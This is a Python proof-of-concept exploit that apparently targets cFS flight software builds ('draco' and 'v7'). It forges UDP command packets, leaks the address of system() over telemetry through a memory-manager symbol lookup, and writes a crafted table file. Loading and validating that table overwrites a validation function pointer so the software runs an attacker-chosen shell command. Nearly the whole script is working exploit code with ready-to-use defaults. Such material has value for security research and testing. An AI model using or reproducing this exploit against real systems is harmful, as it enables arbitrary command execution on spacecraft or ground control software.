import argparse
import socket
import struct
import sys
import time

def pkt(mid, cc=0, payload=b""):
    p = struct.pack(">HHH", mid, 0xC000, 2 + len(payload) - 1)
    return p + bytes([cc]) + bytes([(0xFF - sum(p)) & 0xFF]) + payload

def send(port, data):
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(data, ("127.0.0.1", port))

def load(port, path):
    send(port, pkt(0x1804, 2, path.encode().ljust(64, b"\x00")))
    print(f"[+] TBL_LOAD '{path}' -> :{port}")

def validate(port, name):
    payload = struct.pack(">H", 0) + name.encode()[:39].ljust(40, b"\x00")
    send(port, pkt(0x1804, 4, payload))
    print(f"[+] VALIDATE({name}, inactive) sent")

def nudge(port):
    send(port, pkt(0x1883))
    print(f"[+] SEND_HK nudge -> :{port}")

def build_draco(sys_addr, cmd):
    D, L = 0xB758, len(cmd) + 1
    data = bytearray(D + L)
    data[0:4]       = struct.pack("<I", sys_addr)   # ValidationFuncPtr
    data[0x10:0x14] = struct.pack("<i", 0)          # LoadInProgress        = 0
    data[0x14:0x18] = struct.pack("<i", -1)         # ValidateActiveIndex   = -1
    data[0x18:0x1C] = struct.pack("<i", 0)          # ValidateInactiveIndex = 0
    data[0x1C:0x20] = struct.pack("<i", -1)         # DumpControlIndex      = -1
    data[D:D + L]   = cmd + b"\x00"                 # BufferPtr -> system()'s argument
    return _wrap(data, D, L, "SAMPLE_APP.SampleAppTable")

def build_v7(sys_addr, cmd):
    D, L = 0x10D8C, len(cmd) + 1
    NB = 0x1A0001
    data = bytearray(D + L)
    data[0:4]     = struct.pack("<I", sys_addr)     # Config.ValidationFuncPtr
    data[20:24]   = struct.pack("<I", NB)           # Status.NextBufferId
    data[D:D + L] = cmd + b"\x00"                   # BufferPtr: system()'s argument
    return _wrap(data, D, L, "SAMPLE_APP.ExampleTable")

def _wrap(data, D, L, name):
    blob  = struct.pack(">6I", 0x63464531, 8, 66, 66, 1, 0)
    blob += b"Table Utility Test Table".ljust(40, b"\x00")
    blob += struct.pack(">III", 0, (2**32 - D) & 0xFFFFFFFF, D + L)
    blob += name.encode()[:39].ljust(40, b"\x00")
    return blob + data

def find_system(cmd_port, tlm_port):
    tlm = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    tlm.bind(("127.0.0.1", tlm_port)); tlm.settimeout(2)
    send(cmd_port, pkt(0x1880, 6, b"127.0.0.1:%d\x00" % tlm_port))   # TO_LAB enable
    for _ in range(3):
        send(cmd_port, pkt(0x1888, 9, b"system".ljust(64, b"\x00")))  # MM LOOKUP_SYM
        send(cmd_port, pkt(0x1889))                                   # MM SEND_HK
        try:
            while True:
                p, _ = tlm.recvfrom(4096)
                if ((p[0] << 8) | p[1]) & 0x7FF == 0x087:             # MM_HK_TLM APID
                    return struct.unpack_from("<I", p, 24)[0]
        except socket.timeout:
            pass
    sys.exit("[-] no MM HK telemetry")

TARGETS = {
    "draco": dict(port=1234, tlm_port=1235, build=build_draco,
                  name="SAMPLE_APP.SampleAppTable",
                  steps=("load", "nudge")),
    "v7":    dict(port=2234, tlm_port=2235, build=build_v7,
                  name="SAMPLE_APP.ExampleTable",
                  steps=("load", "validate", "nudge")),
}

def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--version", choices=TARGETS, required=True)
    ap.add_argument("--port", type=int, help="command port (default per target)")
    ap.add_argument("--sys", help="&system hex, or 'auto' (draco only)")
    ap.add_argument("--cmd", default="id", help="command for system() (<=3 chars)")
    ap.add_argument("--out", help="output path (default bin/<version>/cf/my.tbl)")
    a = ap.parse_args()

    t = TARGETS[a.version]
    port = a.port or t["port"]
    out = a.out or f"bin/{a.version}/cf/my.tbl"
    cmd = a.cmd.encode()
    if len(cmd) + 1 > 4:
        sys.exit("command too long for these 4-byte tables (max 3 chars)")

    if a.sys is None or a.sys == "auto":
        if a.version != "draco":
            sys.exit("[-] no auto leak on the v7 image (MM not included in this PoC).\n"
                     "    read it yourself:\n"
                     "    curl localhost:2223/draco/system\n")
        sys_addr = find_system(port, t["tlm_port"])
        print(f"[+] &system leaked over downlink: {sys_addr:#x}")
    else:
        sys_addr = int(a.sys, 16)

    blob = t["build"](sys_addr, cmd)
    open(out, "wb").write(blob)
    print(f"[+] wrote {out}: {len(blob)} bytes (system={sys_addr:#x})")

    for step in t["steps"]:
        if step == "load":
            load(port, "/cf/my.tbl")
            time.sleep(1)
        elif step == "validate":
            validate(port, t["name"])
            time.sleep(1)
        elif step == "nudge":
            nudge(port)

    print("[*] watch the target console for the command output")

if __name__ == "__main__":
    main()
